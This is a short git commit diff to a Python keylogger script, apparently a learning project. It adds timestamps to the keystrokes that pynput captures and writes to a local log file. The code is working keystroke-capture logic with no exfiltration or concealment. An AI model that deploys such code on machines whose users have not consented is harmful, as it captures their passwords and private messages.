44f3c185e19f395e65fe18bd54b716dfb065e354
Noah Whiffen <noah.whiffen@keyin.com>
2025-12-19 20:31:34 -0330

    added SIEM style logging

--- key_logger/key_logger.py
+++ key_logger/key_logger.py
@@ -1,9 +1,13 @@
 import pynput
+from datetime import datetime
 
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
+
+def getTimeStamp():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 
 def onPress(key):
     global count, keys
@@ -18,11 +22,18 @@ def onPress(key):
 def writeFile(keys):
     with open("log.txt", "a") as f:
         for key in keys:
+            timestamp = getTimeStamp()
             k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write('\n')
-            elif k.find("Key") == -1:
-                f.write(k)
+
+            if k == "Key.space":
+                f.write(f"[{timestamp}] SPACE\n")
+            elif k == "Key.enter":
+                f.write(f"[{timestamp}] ENTER\n")
+            elif k.startswith("Key."):
+                f.write(f"[{timestamp}] {k}\n")
+            else:
+                f.write(f"[{timestamp}] {k}\n")
+                
 
 def onRelease(key):
     if key == Key.esc:
